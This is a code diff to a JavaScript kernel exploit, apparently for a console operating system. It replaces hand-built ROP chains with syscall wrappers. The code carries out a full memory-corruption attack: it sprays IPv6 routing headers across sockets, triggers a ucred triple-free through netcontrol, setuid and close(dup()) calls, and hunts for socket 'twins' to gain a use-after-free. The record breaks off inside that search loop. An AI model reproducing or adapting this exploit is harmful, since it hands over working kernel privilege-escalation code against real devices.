@@ -84,8 +84,8 @@ if (syscalls.map.has(0x61)) {
   kapi.socket_hi = addr.hi()
   kapi.socket_found = true
 }
-if (syscalls.map.has(0x88)) {
-  var addr = syscalls.map.get(0x88)
+if (syscalls.map.has(0x87)) {
+  var addr = syscalls.map.get(0x87)
   kapi.socketpair_lo = addr.lo()
   kapi.socketpair_hi = addr.hi()
   kapi.socketpair_found = true
@@ -143,6 +143,30 @@ if (!kapi.socket_found || !kapi.socketpair_found || !kapi.setsockopt_found || !k
 
 log('=== NetControl ===')
 
+// Create syscall wrappers using fn.create()
+var socket = fn.create(0x61, ['bigint', 'bigint', 'bigint'], 'bigint')
+var socketpair = fn.create(0x87, ['bigint', 'bigint', 'bigint', 'bigint'], 'bigint')
+var setsockopt = fn.create(0x69, ['bigint', 'bigint', 'bigint', 'bigint', 'bigint'], 'bigint')
+var getsockopt = fn.create(0x76, ['bigint', 'bigint', 'bigint', 'bigint', 'bigint'], 'bigint')
+var close_sys = fn.create(0x06, ['bigint'], 'bigint')
+var setuid = fn.create(0x17, ['bigint'], 'bigint')
+var dup_sys = fn.create(0x29, ['bigint'], 'bigint')
+var recvmsg = fn.create(0x1B, ['bigint', 'bigint', 'bigint'], 'bigint')
+var netcontrol = fn.create(0x63, ['bigint', 'bigint', 'bigint', 'bigint'], 'bigint')
+var read_sys = fn.create(0x03, ['bigint', 'bigint', 'bigint'], 'bigint')
+var write_sys = fn.create(0x04, ['bigint', 'bigint', 'bigint'], 'bigint')
+
+// Extract wrapper addresses for ROP chains (pthread workers)
+var read_wrapper = read_sys.addr
+var write_wrapper = write_sys.addr
+var recvmsg_wrapper = recvmsg.addr
+
+// Get pthread_create address from libkernel
+var pthread_create_addr = libkernel_addr.add(new BigInt(0, SCE_PTHREAD_CREATE_OFFSET))
+
+log('Created syscall wrappers via fn.create()')
+log('pthread_create at: ' + pthread_create_addr.toString())
+
 // Pre-allocate all buffers once (reuse throughout exploit)
 var store_addr = mem.malloc(0x100)
 var rthdr_buf = mem.malloc(UCRED_SIZE)
@@ -155,30 +179,18 @@ log('rthdr_buf: ' + rthdr_buf.toString())
 var ipv6_sockets = new Int32Array(IPV6_SOCK_NUM)
 var socket_count = 0
 
-// Build socket() ROP chain once (reuse for all sockets)
-var socket_wrapper = new BigInt(kapi.socket_hi, kapi.socket_lo)
-var socket_insts = build_rop_chain(
-  socket_wrapper,
-  new BigInt(0, AF_INET6),
-  new BigInt(0, SOCK_STREAM),
-  new BigInt(0, 0)
-)
-rop.store(socket_insts, store_addr, 1)
-
 log('Creating ' + IPV6_SOCK_NUM + ' IPv6 sockets...')
 
-// Create IPv6 sockets (reuse same ROP chain and store_addr)
+// Create IPv6 sockets using socket()
 for (var i = 0; i < IPV6_SOCK_NUM; i++) {
-  rop.execute(socket_insts, store_addr, 0x10)
-  var fd = mem.read8(store_addr.add(new BigInt(0, 8)))
+  var fd = socket(AF_INET6, SOCK_STREAM, 0)
 
-  if (fd.hi() === 0xFFFFFFFF) {
+  if (fd === -1) {
     log('ERROR: socket() failed at index ' + i)
-    log('Return value: ' + fd.toString())
     break
   }
 
-  ipv6_sockets[i] = fd.lo()
+  ipv6_sockets[i] = fd
   socket_count++
 }
 
@@ -191,25 +203,12 @@ if (socket_count !== IPV6_SOCK_NUM) {
 
 log('Initializing pktopts on all sockets...')
 
-// Build setsockopt(fd, IPPROTO_IPV6, IPV6_RTHDR, NULL, 0) ROP chain template
-var init_wrapper = new BigInt(kapi.setsockopt_hi, kapi.setsockopt_lo)
-
 // Initialize pktopts by calling setsockopt with NULL buffer
 var init_count = 0
 for (var i = 0; i < IPV6_SOCK_NUM; i++) {
-  var init_insts = build_rop_chain(
-    init_wrapper,
-    new BigInt(0, ipv6_sockets[i]),
-    new BigInt(0, IPPROTO_IPV6),
-    new BigInt(0, IPV6_RTHDR),
-    new BigInt(0, 0), // NULL buffer
-    new BigInt(0, 0)  // size 0
-  )
-  rop.store(init_insts, store_addr, 1)
-  rop.execute(init_insts, store_addr, 0x10)
-  var ret = mem.read8(store_addr.add(new BigInt(0, 8)))
+  var ret = setsockopt(ipv6_sockets[i], IPPROTO_IPV6, IPV6_RTHDR, 0, 0)
 
-  if (ret.hi() !== 0xFFFFFFFF || ret.lo() !== 0xFFFFFFFF) {
+  if (ret !== -1) {
     init_count++
   }
 }
@@ -239,23 +238,12 @@ log('Built routing header template (size=' + rthdr_size + ' bytes)')
 // Spray routing headers with tagged values across all sockets
 log('Spraying routing headers across ' + IPV6_SOCK_NUM + ' sockets...')
 
-var setsockopt_wrapper = new BigInt(kapi.setsockopt_hi, kapi.setsockopt_lo)
-
 for (var i = 0; i < IPV6_SOCK_NUM; i++) {
   // Write unique tag at offset 0x04 (RTHDR_TAG | socket_index)
   mem.write4(rthdr_buf.add(new BigInt(0, 4)), RTHDR_TAG | i)
 
   // Call setsockopt(fd, IPPROTO_IPV6, IPV6_RTHDR, rthdr_buf, rthdr_size)
-  var spray_insts = build_rop_chain(
-    setsockopt_wrapper,
-    new BigInt(0, ipv6_sockets[i]),
-    new BigInt(0, IPPROTO_IPV6),
-    new BigInt(0, IPV6_RTHDR),
-    rthdr_buf,
-    new BigInt(0, rthdr_size)
-  )
-  rop.store(spray_insts, store_addr, 1)
-  rop.execute(spray_insts, store_addr, 0x10)
+  setsockopt(ipv6_sockets[i], IPPROTO_IPV6, IPV6_RTHDR, rthdr_buf, rthdr_size)
 }
 
 log('Sprayed ' + IPV6_SOCK_NUM + ' routing headers')
@@ -263,22 +251,6 @@ log('Sprayed ' + IPV6_SOCK_NUM + ' routing headers')
 // ============================================================================
 // STAGE 3: Trigger ucred triple-free and find twins/triplet
 // ============================================================================
-
-// Get syscall wrappers
-var pthread_create_addr = libkernel_addr.add(new BigInt(0, SCE_PTHREAD_CREATE_OFFSET))
-var pthread_exit_addr = libkernel_addr.add(new BigInt(0, SCE_PTHREAD_EXIT_OFFSET))
-var read_wrapper = new BigInt(kapi.read_hi, kapi.read_lo)
-var write_wrapper = new BigInt(kapi.write_hi, kapi.write_lo)
-var recvmsg_wrapper = new BigInt(kapi.recvmsg_hi, kapi.recvmsg_lo)
-var socketpair_wrapper = new BigInt(kapi.socketpair_hi, kapi.socketpair_lo)
-var mprotect_wrapper = kapi.mprotect_found ? new BigInt(kapi.mprotect_hi, kapi.mprotect_lo) : null
-
-log('scePthreadCreate at: ' + pthread_create_addr.toString())
-log('scePthreadExit at: ' + pthread_exit_addr.toString())
-log('socketpair wrapper at: ' + socketpair_wrapper.toString())
-if (mprotect_wrapper) {
-  log('mprotect wrapper at: ' + mprotect_wrapper.toString())
-}
 
 // Allocate buffers
 var set_buf = mem.malloc(8)
@@ -292,71 +264,27 @@ var twins = [-1, -1]
 var triplets = [-1, -1, -1]
 var uaf_sock = -1
 
-// Try socketpair - allocate buffer in ROP writable region
-log('Attempting socketpair with different buffer strategies...')
+// Try socketpair using fn.create() approach
+log('Attempting socketpair...')
 
-// Strategy 1: Allocate large buffer and try at different offsets
-var large_buf = new Uint8Array(PAGE_SIZE * 2)
-var large_backing = utils.get_backing(large_buf)
-log('Large buffer backing at: ' + large_backing.toString())
+var sp_buf = mem.malloc(8)
+log('Allocated socketpair buffer at: ' + sp_buf.toString())
 
-// Try buffer at page boundary within our allocation
-var sp_buf = new BigInt(0, (large_backing.lo() + PAGE_SIZE) & ~(PAGE_SIZE - 1))
-sp_buf = new BigInt(large_backing.hi(), sp_buf.lo())
-log('Page-aligned buffer within allocation at: ' + sp_buf.toString())
+socketpair(1, 1, 0, sp_buf)
 
-// Try mprotect to make entire region RWX
-if (mprotect_wrapper) {
-  var PROT_READ = 1
-  var PROT_WRITE = 2
-  var PROT_EXEC = 4
-  var prot = PROT_READ | PROT_WRITE
+var iov_ss0 = mem.read4(sp_buf).lo() & 0xFFFFFFFF
+var iov_ss1 = mem.read4(sp_buf.add(new BigInt(0, 4))).lo() & 0xFFFFFFFF
 
-  log('Calling mprotect(' + sp_buf.toString() + ', ' + PAGE_SIZE + ', ' + prot + ')')
-
-  var mprotect_insts = build_rop_chain(
-    mprotect_wrapper,
-    sp_buf,
-    new BigInt(0, PAGE_SIZE),
-    new BigInt(0, prot)
-  )
-  rop.store(mprotect_insts, store_addr, 1)
-  rop.execute(mprotect_insts, store_addr, 0x10)
-  var mprotect_ret = mem.read8(store_addr.add(new BigInt(0, 8)))
-
-  if (mprotect_ret.hi() === 0xFFFFFFFF) {
-    log('WARNING: mprotect failed, return: ' + mprotect_ret.toString())
-  } else {
-    log('mprotect succeeded')
-  }
-}
-
-var socketpair_insts = build_rop_chain(
-  socketpair_wrapper,
-  new BigInt(0, AF_UNIX),
-  new BigInt(0, SOCK_STREAM),
-  new BigInt(0, 0),
-  sp_buf
-)
-
-log('Calling socketpair(AF_UNIX, SOCK_STREAM, 0, ' + sp_buf.toString() + ')')
-
-rop.store(socketpair_insts, store_addr, 1)
-rop.execute(socketpair_insts, store_addr, 0x10)
-var sp_ret = mem.read8(store_addr.add(new BigInt(0, 8)))
-
-log('socketpair returned: ' + sp_ret.toString())
-
-if (sp_ret.hi() === 0xFFFFFFFF) {
-  var errno_val = fn._error()
+if (iov_ss0 === 0xFFFFFFFF || iov_ss1 === 0xFFFFFFFF) {
+  var errno_val = _error()
   var errno_int = mem.read4(errno_val)
-  var errno_str = fn.strerror(errno_int)
+  var errno_str = strerror(errno_int)
+  log('ERROR: socketpair failed')
+  log('  errno: ' + errno_int + ' (' + errno_str + ')')
+  log('  fds: [' + iov_ss0 + ', ' + iov_ss1 + ']')
   throw new Error('socketpair failed with errno ' + errno_int)
 }
 
-// Read results from buffer
-var iov_ss0 = mem.read4(sp_buf) & 0xFFFFFFFF
-var iov_ss1 = mem.read4(sp_buf.add(new BigInt(0, 4))) & 0xFFFFFFFF
 log('SUCCESS! Created socketpair: [' + iov_ss0 + ', ' + iov_ss1 + ']')
 
 // Prepare msg_iov buffer (iov_base=1 will become cr_refcnt)
@@ -378,16 +306,7 @@ if (iov_ss0 !== -1 && iov_ss1 !== -1) {
   // Create UNIX sockets for each worker (for recvmsg spray)
   var worker_sockets = []
   for (var w = 0; w < IOV_THREAD_NUM; w++) {
-    var worker_sock_insts = build_rop_chain(
-      socket_wrapper,
-      new BigInt(0, AF_UNIX),
-      new BigInt(0, SOCK_STREAM),
-      new BigInt(0, 0)
-    )
-    rop.store(worker_sock_insts, store_addr, 1)
-    rop.execute(worker_sock_insts, store_addr, 0x10)
-    var worker_sock_result = mem.read8(store_addr.add(new BigInt(0, 8)))
-    var worker_sock_fd = worker_sock_result.lo() & 0xFFFFFFFF // Ensure it's a plain integer
+    var worker_sock_fd = socket(AF_UNIX, SOCK_STREAM, 0).lo() & 0xFFFFFFFF
     worker_sockets.push(worker_sock_fd)
   }
   log('Created ' + IOV_THREAD_NUM + ' sockets for worker recvmsg spray: ' + worker_sockets.join(', '))
@@ -474,78 +393,39 @@ if (iov_ss0 !== -1 && iov_ss1 !== -1) {
 }
 
 // Create dummy socket to register with netcontrol
-var socket_wrapper = new BigInt(kapi.socket_hi, kapi.socket_lo)
-var dummy_sock_insts = build_rop_chain(
-  socket_wrapper,
-  new BigInt(0, AF_UNIX),
-  new BigInt(0, SOCK_STREAM),
-  new BigInt(0, 0)
-)
-rop.store(dummy_sock_insts, store_addr, 1)
-rop.execute(dummy_sock_insts, store_addr, 0x10)
-var dummy_sock = mem.read8(store_addr.add(new BigInt(0, 8))).lo()
+var dummy_sock = socket(AF_UNIX, SOCK_STREAM, 0)
 
 log('Created dummy socket: fd=' + dummy_sock)
 
 // Register dummy socket with netcontrol
 mem.write4(set_buf, dummy_sock)
-var netcontrol_wrapper = new BigInt(kapi.netcontrol_hi, kapi.netcontrol_lo)
-var set_insts = build_rop_chain(
-  netcontrol_wrapper,
-  new BigInt(0xFFFFFFFF, 0xFFFFFFFF), // -1
-  new BigInt(0, NET_CONTROL_NETEVENT_SET_QUEUE),
-  set_buf,
-  new BigInt(0, 8)
-)
-rop.store(set_insts, store_addr, 1)
-rop.execute(set_insts, store_addr, 0x10)
+netcontrol(-1, NET_CONTROL_NETEVENT_SET_QUEUE, set_buf, 8)
 
 log('Registered dummy socket with netcontrol')
 
 // Close dummy socket
-var close_wrapper = new BigInt(kapi.close_hi, kapi.close_lo)
-var close_insts = build_rop_chain(
-  close_wrapper,
-  new BigInt(0, dummy_sock)
-)
-rop.store(close_insts, store_addr, 1)
-rop.execute(close_insts, store_addr, 0x10)
+close_sys(dummy_sock)
 
 log('Closed dummy socket')
 
 // Allocate new ucred via setuid
-var setuid_wrapper = new BigInt(kapi.setuid_hi, kapi.setuid_lo)
-var setuid_insts = build_rop_chain(
-  setuid_wrapper,
-  new BigInt(0, 1)
-)
-rop.store(setuid_insts, store_addr, 1)
-rop.execute(setuid_insts, store_addr, 0x10)
+setuid(1)
 
 log('Allocated ucred via setuid(1)')
 
 // Reclaim file descriptor with new socket
-rop.execute(dummy_sock_insts, store_addr, 0x10)
-uaf_sock = mem.read8(store_addr.add(new BigInt(0, 8))).lo()
+uaf_sock = socket(AF_UNIX, SOCK_STREAM, 0)
 
 log('Reclaimed fd with UAF socket: fd=' + uaf_sock)
 
 // Free previous ucred via setuid again
-rop.execute(setuid_insts, store_addr, 0x10)
+setuid(1)
 
 log('Freed ucred via setuid(1)')
 
 // Unregister and trigger final free
 mem.write4(clear_buf, uaf_sock)
-var clear_insts = build_rop_chain(
-  netcontrol_wrapper,
-  new BigInt(0xFFFFFFFF, 0xFFFFFFFF), // -1
-  new BigInt(0, NET_CONTROL_NETEVENT_CLEAR_QUEUE),
-  clear_buf,
-  new BigInt(0, 8)
-)
-rop.store(clear_insts, store_addr, 1)
-rop.execute(clear_insts, store_addr, 0x10)
+netcontrol(-1, NET_CONTROL_NETEVENT_CLEAR_QUEUE, clear_buf, 8)
 
 log('Unregistered socket (triple-free triggered)')
 
@@ -555,24 +435,10 @@ if (iov_ss0 !== -1 && iov_ss1 !== -1) {
   log('Spraying IOV with workers (32 iterations)...')
   for (var i = 0; i < 32; i++) {
     // Signal workers to spray
-    var write_insts = build_rop_chain(
-      write_wrapper,
-      new BigInt(0, iov_ss1),
-      tmp_buf,
-      new BigInt(0, 8)
-    )
-    rop.store(write_insts, store_addr, 1)
-    rop.execute(write_insts, store_addr, 0x10)
+    write_sys(iov_ss1, tmp_buf, 8)
 
     // Wait for workers to complete
-    var read_insts = build_rop_chain(
-      read_wrapper,
-      new BigInt(0, iov_ss0),
-      tmp_buf,
-      new BigInt(0, 8)
-    )
-    rop.store(read_insts, store_addr, 1)
-    rop.execute(read_insts, store_addr, 0x10)
+    read_sys(iov_ss0, tmp_buf, 8)
   }
   log('IOV spray complete (workers)')
 } else {
@@ -583,84 +449,34 @@ if (iov_ss0 !== -1 && iov_ss1 !== -1) {
   mem.write8(msg_hdr.add(new BigInt(0, 0x10)), msg_iov)
   mem.write4(msg_hdr.add(new BigInt(0, 0x18)), MSG_IOV_NUM)
 
-  var spray_sock_insts = build_rop_chain(
-    socket_wrapper,
-    new BigInt(0, AF_UNIX),
-    new BigInt(0, SOCK_STREAM),
-    new BigInt(0, 0)
-  )
-  rop.store(spray_sock_insts, store_addr, 1)
-  rop.execute(spray_sock_insts, store_addr, 0x10)
-  var spray_sock = mem.read8(store_addr.add(new BigInt(0, 8))).lo()
+  var spray_sock = socket(AF_UNIX, SOCK_STREAM, 0)
 
   for (var i = 0; i < 32; i++) {
-    var recvmsg_insts = build_rop_chain(
-      recvmsg_wrapper,
-      new BigInt(0, spray_sock),
-      msg_hdr,
-      new BigInt(0, 0x80)
-    )
-    rop.store(recvmsg_insts, store_addr, 1)
-    rop.execute(recvmsg_insts, store_addr, 0x10)
+    recvmsg(spray_sock, msg_hdr, 0x80)
   }
   log('IOV spray complete (synchronous)')
 }
 
 // Double free ucred (only dup works - doesn't check f_hold)
-var dup_wrapper = new BigInt(kapi.dup_hi, kapi.dup_lo)
-var dup_insts = build_rop_chain(
-  dup_wrapper,
-  new BigInt(0, uaf_sock)
-)
-rop.store(dup_insts, store_addr, 1)
-rop.execute(dup_insts, store_addr, 0x10)
-var dup_fd = mem.read8(store_addr.add(new BigInt(0, 8))).lo()
-
-var close_dup_insts = build_rop_chain(
-  close_wrapper,
-  new BigInt(0, dup_fd)
-)
-rop.store(close_dup_insts, store_addr, 1)
-rop.execute(close_dup_insts, store_addr, 0x10)
+var dup_fd = dup_sys(uaf_sock)
+close_sys(dup_fd)
 
 log('Double freed ucred via close(dup(uaf_sock))')
 
 // Find twins - two sockets sharing same routing header
-var setsockopt_wrapper = new BigInt(kapi.setsockopt_hi, kapi.setsockopt_lo)
-var getsockopt_wrapper = new BigInt(kapi.getsockopt_hi, kapi.getsockopt_lo)
 var found_twins = false
 
 for (var attempt = 0; attempt < 10 && !found_twins; attempt++) {
   // Re-spray tags across all sockets
   for (var i = 0; i < IPV6_SOCK_NUM; i++) {
     mem.write4(rthdr_buf.add(new BigInt(0, 4)), RTHDR_TAG | i)
-
-    var spray_insts = build_rop_chain(
-      setsockopt_wrapper,
-      new BigInt(0, ipv6_sockets[i]),
-      new BigInt(0, IPPROTO_IPV6),
-      new BigInt(0, IPV6_RTHDR),
-      rthdr_buf,
-      new BigInt(0, rthdr_size)
-    )
-    rop.store(spray_insts, store_addr, 1)
-    rop.execute(spray_insts, store_addr, 0x10)
+    setsockopt(ipv6_sockets[i], IPPROTO_IPV6, IPV6_RTHDR, rthdr_buf, rthdr_size)
   }
 
   // Check for twins
   for (var i = 0; i < IPV6_SOCK_NUM; i++) {
     mem.write8(leak_len_buf, new BigInt(0, UCRED_SIZE))
-
-    var get_insts = build_rop_chain(
-      getsockopt_wrapper,
-      new BigInt(0, ipv6_sockets[i]),
-      new BigInt(0, IPPROTO_IPV6),
-      new BigInt(0, IPV6_RTHDR),
-      leak_rthdr_buf,
-      leak_len_buf
-    )
-    rop.store(get_insts, store_addr, 1)
-    rop.execute(get_insts, store_addr, 0x10)
+    getsockopt(ipv6_sockets[i], IPPROTO_IPV6, IPV6_RTHDR, leak_rthdr_buf, leak_len_buf)
 
     var val = mem.read4(leak_rthdr_buf.add(new BigInt(0, 4)))
     var j = val & 0xFFFF
